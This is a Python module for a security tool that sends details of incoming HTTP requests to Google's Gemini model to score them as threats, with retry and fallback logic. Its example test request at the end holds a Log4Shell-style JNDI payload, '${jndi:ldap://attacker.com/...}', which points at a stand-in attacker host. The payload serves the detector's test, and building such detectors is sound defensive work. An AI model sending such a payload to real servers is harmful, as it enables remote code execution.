# ai_engine.py - Tier 2: LLM-based Semantic Analysis
import json
import os
from typing import Dict, Optional
import httpx
from datetime import datetime
from dotenv import load_dotenv
import asyncio
import logging

# Load environment variables from .env file
load_dotenv()

logger = logging.getLogger(__name__)

class AISecurityAnalyzer:
    """
    Tier 2 Analysis: LLM-based semantic analysis for ambiguous requests
    Uses Google Gemini to detect Zero-Day logic flaws and polyglot attacks
    """
    
    # Using Google Gemini API (free tier available)
    MODEL = "gemini-2.5-flash"  # Latest stable model - quota confirmed working
    MAX_TOKENS = 500
    TEMPERATURE = 0.2  # Low temperature for consistent, focused analysis
    
    SYSTEM_PROMPT = """You are a STRICT cybersecurity threat detection AI. Your job is to identify even SUBTLE attack patterns.

THREAT SCORING GUIDELINES (0-10):
- 9-10: DEFINITE THREAT - SQL injection, RCE, XXE, clear exploit vectors
- 7-8: HIGH LIKELIHOOD - Suspicious patterns, bypass attempts, obfuscation
- 6-7: MODERATE RISK - Unusual request patterns, anomalies
- 5-6: SUSPICIOUS - Missing headers, odd methods, timing anomalies, empty bodies with POST
- 4-5: MINOR ANOMALY - Slightly unusual but could be legitimate
- 0-3: NORMAL - Standard traffic

THREAT INDICATORS TO DETECT:
1. ANOMALY ATTACKS: POST to root "/", empty request body, missing user-agent
2. TIMING ATTACKS: Extremely fast/slow responses, patterns in response times
3. INFORMATION DISCLOSURE: Excessive headers, verbose responses
4. RESOURCE EXHAUSTION: Large payloads, repeated requests to same endpoint
5. PROTOCOL VIOLATIONS: Invalid HTTP usage, odd header combinations
6. BEHAVIOR ANOMALIES: Bot-like patterns, synchronized requests, unusual client stats

SEVERITY BOOST RULES:
- Empty POST body to root path = +3 severity (anomaly attack)
- Missing standard headers = +2 severity
- Unusual response times = +2 severity
- Non-standard client patterns = +2 severity

BE AGGRESSIVE: The Tier 1 system already catches known threats. You specialize in NOVEL/ANOMALY threats.
If there's ANY unusual pattern, classify as at least 5+ severity."""
    
    def __init__(self, api_key: Optional[str] = None):
        """Initialize with Google Gemini API key"""
        self.api_key = api_key or os.getenv('GOOGLE_API_KEY')
        if not self.api_key:
            raise ValueError("Google API key not found. Set GOOGLE_API_KEY environment variable.")
        
        # Google Gemini API endpoint (using v1, not v1beta)
        self.base_url = "https://generativelanguage.googleapis.com/v1/models"
        self.client = httpx.AsyncClient(timeout=30.0)
        self.request_count = 0
        self.total_tokens_used = 0
    
    def _build_analysis_prompt(self, request_data: Dict) -> str:
        """Build the user prompt for LLM analysis"""
        return f"""ANALYZE THIS HTTP REQUEST FOR THREATS:

METHOD: {request_data.get('method', 'GET')}
PATH: {request_data.get('path', '/')}
USER_AGENT: {request_data.get('headers', {}).get('user-agent', 'MISSING')}
CLIENT_IP: {request_data.get('client_ip', 'N/A')}
RESPONSE_STATUS: {request_data.get('response_status', 200)}
RESPONSE_TIME_MS: {request_data.get('response_time_ms', 0)}
HEADERS_COUNT: {len(request_data.get('headers', {}))}
BODY_LENGTH: {len(request_data.get('request_body_preview', ''))} bytes
BODY_PREVIEW: {request_data.get('request_body_preview', '(EMPTY)')}

CRITICAL CHECK:
- Is this a POST request to "/" (root) with empty/minimal body? (HIGH ANOMALY)
- Is user-agent missing? (SUSPICIOUS)
- Are required security headers missing? (RISK)
- Does response time seem unusual? (POTENTIAL ATTACK)
- Is the request pattern bot-like or automated? (SUSPICIOUS)

Respond ONLY with valid JSON - BE SPECIFIC ABOUT SEVERITY:
{{
  "severity": <5-10 for anomalies, 0-4 for normal>,
  "threat_type": "<ANOMALY_ATTACK|TIMING_ATTACK|HEADER_ANOMALY|EMPTY_POST_ROOT|NORMAL>",
  "confidence": <0.5-1.0 if threat, 0.0-0.3 if normal>,
  "is_zerodday": <true if novel pattern>,
  "attack_vectors": ["<specific anomalies found>"],
  "reasoning": "<why this is/isn't a threat>",
  "recommended_action": "<block|investigate|monitor|allow>",
  "indicators": ["<specific indicators>"],
  "cve_reference": ["none"]
}}"""
    
    async def analyze(self, request_data: Dict) -> Dict:
        """
        Send request to Google Gemini for security analysis
        Returns AI verdict with severity and reasoning
        Implements exponential backoff for rate limiting (429 errors)
        """
        self.request_count += 1
        
        # Retry configuration - INCREASED for Gemini free tier (60 req/min quota)
        max_retries = 4
        initial_delay = 3  # Start with 3 seconds (was 2)
        
        for attempt in range(max_retries):
            try:
                user_prompt = self._build_analysis_prompt(request_data)
                
                # Call Google Gemini API using REST endpoint
                headers = {
                    "Content-Type": "application/json"
                }
                
                payload = {
                    "contents": [
                        {
                            "role": "user",
                            "parts": [
                                {"text": f"{self.SYSTEM_PROMPT}\n\n{user_prompt}"}
                            ]
                        }
                    ],
                    "generationConfig": {
                        "maxOutputTokens": self.MAX_TOKENS,
                        "temperature": self.TEMPERATURE
                    }
                }
                
                # Use API key in URL for authentication
                url = f"{self.base_url}/{self.MODEL}:generateContent?key={self.api_key}"
                
                response = await self.client.post(url, headers=headers, json=payload)
                
                if response.status_code == 429:
                    if attempt < max_retries - 1:
                        delay = initial_delay * (2 ** attempt)  # 2, 4, 8 seconds
                        logger.warning(f"Rate limited (429). Retry {attempt + 1}/{max_retries - 1} after {delay}s delay")
                        await asyncio.sleep(delay)
                        continue
                    else:
                        logger.warning(f"Rate limited after {max_retries} attempts. Returning conservative result.")
                        return {
                            'severity': 3,
                            'threat_type': 'API_RATE_LIMITED',
                            'confidence': 0,
                            'reasoning': 'Gemini API rate limited - use Tier 1 assessment',
                            'recommended_action': 'investigate',
                            'error': 'Rate limited'
                        }
                
                # Handle 503 Service Unavailable (be aggressive - treat ambiguous as threat)
                if response.status_code == 503:
                    logger.warning(f"Gemini API unavailable (503). Assuming threat for ambiguous requests.")
                    return {
                        'severity': 6,  # Moderate-high threat when API down on ambiguous case
                        'threat_type': 'SERVICE_UNAVAILABLE_DEFENSIVE',
                        'confidence': 0.4,
                        'reasoning': 'LLM service temporarily unavailable - applying defensive scoring to ambiguous request',
                        'recommended_action': 'investigate',
                        'error': 'Service unavailable (503)'
                    }
                
                if response.status_code != 200:
                    error_detail = response.text
                    return {
                        'severity': 5,  # Moderate threat on API errors
                        'threat_type': 'API_ERROR',
                        'confidence': 0.3,
                        'reasoning': f'LLM analysis failed (HTTP {response.status_code}): {error_detail[:100]}',
                        'recommended_action': 'investigate',
                        'error': error_detail
                    }
                
                result = response.json()
                
                # Extract text from Gemini response
                try:
                    ai_response = result['candidates'][0]['content']['parts'][0]['text']
                except (KeyError, IndexError) as e:
                    return {
                        'severity': 2,
                        'threat_type': 'PARSE_ERROR',
                        'confidence': 0,
                        'reasoning': f'Failed to parse Gemini response: {str(e)}',
                        'recommended_action': 'investigate'
                    }
                
                # Try to extract JSON from response
                try:
                    ai_analysis = json.loads(ai_response)
                except json.JSONDecodeError:
                    # Handle markdown code blocks: ```json {...} ```
                    import re
                    
                    # First try to strip markdown code blocks
                    clean_response = re.sub(r'```json\s*', '', ai_response)
                    clean_response = re.sub(r'```\s*$', '', clean_response)
                    
                    # Try parsing cleaned response
                    try:
                        ai_analysis = json.loads(clean_response)
                        logger.info("Successfully parsed markdown-wrapped JSON")
                    except json.JSONDecodeError:
                        # If still not valid, extract JSON object
                        json_match = re.search(r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}', clean_response, re.DOTALL)
                        if json_match:
                            try:
                                ai_analysis = json.loads(json_match.group())
                                logger.info("Successfully extracted JSON object from response")
                            except json.JSONDecodeError as je:
                                logger.error(f"JSON extraction failed: {str(je)}\nResponse: {ai_response[:200]}")
                                return self._fallback_analysis(ai_response)
                        else:
                            logger.error(f"No JSON object found in response: {ai_response[:200]}")
                            return self._fallback_analysis(ai_response)
                
                # Estimate tokens (Gemini doesn't expose token counts in free tier)
                # Rough estimation: ~4 chars per token
                self.total_tokens_used += len(ai_response) // 4
                
                logger.info(f"Tier 2 analysis successful (attempt {attempt + 1})")
                
                # Validate and normalize response
                return self._normalize_ai_response(ai_analysis)
                
            except asyncio.TimeoutError:
                if attempt < max_retries - 1:
                    delay = initial_delay * (2 ** attempt)
                    logger.warning(f"Timeout. Retry {attempt + 1}/{max_retries - 1} after {delay}s delay")
                    await asyncio.sleep(delay)
                    continue
            except Exception as e:
                logger.error(f"Attempt {attempt + 1} failed: {str(e)}")
                if attempt == max_retries - 1:
                    return {
                        'severity': 2,
                        'threat_type': 'ANALYSIS_ERROR',
                        'confidence': 0,
                        'reasoning': f'Unexpected error after {max_retries} attempts: {str(e)}',
                        'recommended_action': 'monitor',
                        'error': str(e)
                    }
                await asyncio.sleep(initial_delay * (2 ** attempt))
                continue
        
        # Fallback if all retries exhausted
        return {
            'severity': 2,
            'threat_type': 'ANALYSIS_FAILED',
            'confidence': 0,
            'reasoning': 'All API attempts failed',
            'recommended_action': 'monitor'
        }
    
    def _normalize_ai_response(self, ai_response: Dict) -> Dict:
        """Normalize and validate AI response structure"""
        return {
            'severity': min(10, max(0, int(ai_response.get('severity', 0)))),
            'threat_type': ai_response.get('threat_type', 'UNKNOWN'),
            'confidence': min(1.0, max(0.0, float(ai_response.get('confidence', 0.5)))),
            'is_zerodday': ai_response.get('is_zerodday', False),
            'attack_vectors': ai_response.get('attack_vectors', []),
            'reasoning': ai_response.get('reasoning', 'No reasoning provided'),
            'recommended_action': ai_response.get('recommended_action', 'monitor'),
            'indicators': ai_response.get('indicators', []),
            'cve_reference': ai_response.get('cve_reference', [])
        }
    
    def _fallback_analysis(self, response: str) -> Dict:
        """Fallback analysis when API response parsing fails"""
        # Aggressive scoring - if Gemini tried to analyze, it likely saw something
        severity = 4  # Base level for fallback analysis
        
        # Boost severity if key threat indicators in response
        response_lower = response.lower()
        
        if any(x in response_lower for x in ['attack', 'exploit', 'malicious', 'suspicious']):
            severity = 7
        if any(x in response_lower for x in ['zerodday', 'zero-day', 'novel', 'anomal']):
            severity = 8
        if any(x in response_lower for x in ['block', 'urgent', 'critical']):
            severity = 9
        
        # For ambiguous/empty POST patterns, assume moderate threat  
        if 'post' in response_lower and ('root' in response_lower or 'empty' in response_lower):
            severity = max(severity, 6)
        
        logger.warning(f"Fallback analysis applied. Detected threat severity: {severity}")
        
        return {
            'severity': severity,
            'threat_type': 'ANOMALY_DETECTED',  # Changed from ANALYSIS_UNCERTAIN
            'confidence': 0.5,
            'reasoning': f'LLM response required fallback parsing. Detected anomaly pattern.',
            'recommended_action': 'investigate' if severity >= 6 else 'monitor',
            'raw_response': response[:150]
        }
    
    def get_stats(self) -> Dict:
        """Get usage statistics for cost tracking"""
        # Google Gemini free tier: No cost (up to 60 requests/minute)
        # Paid tier (if needed): $0.00075 per 1000 input tokens, $0.0003 per 1000 output tokens
        # For free tier, cost is always $0
        estimated_cost = 0.0  # Free tier
        
        return {
            'requests_analyzed': self.request_count,
            'total_tokens_used': self.total_tokens_used,
            'estimated_cost_usd': estimated_cost,
            'avg_tokens_per_request': round(self.total_tokens_used / max(1, self.request_count), 1),
            'api_provider': 'Google Gemini (Free Tier)'
        }
    
    async def close(self):
        """Close HTTP client connection"""
        await self.client.aclose()


# Synchronous wrapper for easier use
class AISecurityAnalyzerSync(AISecurityAnalyzer):
    """Synchronous wrapper around async AI analyzer"""
    
    def analyze_sync(self, request_data: Dict) -> Dict:
        """Synchronous analysis (blocks until complete)"""
        import asyncio
        
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        return loop.run_until_complete(self.analyze(request_data))


# Example usage
if __name__ == '__main__':
    import asyncio
    
    async def test():
        analyzer = AISecurityAnalyzer()
        
        test_request = {
            'method': 'POST',
            'path': 'api/process',
            'request_body_preview': "{ 'data': '${jndi:ldap://attacker.com/...}' }",
            'headers': {'user-agent': 'Mozilla/5.0'},
            'client_ip': '203.0.113.45',
            'response_status': 200,
            'response_time_ms': 45
        }
        
        result = await analyzer.analyze(test_request)
        print(json.dumps(result, indent=2))
        print(f"\nStats: {analyzer.get_stats()}")
        
        await analyzer.close()
    
    asyncio.run(test())
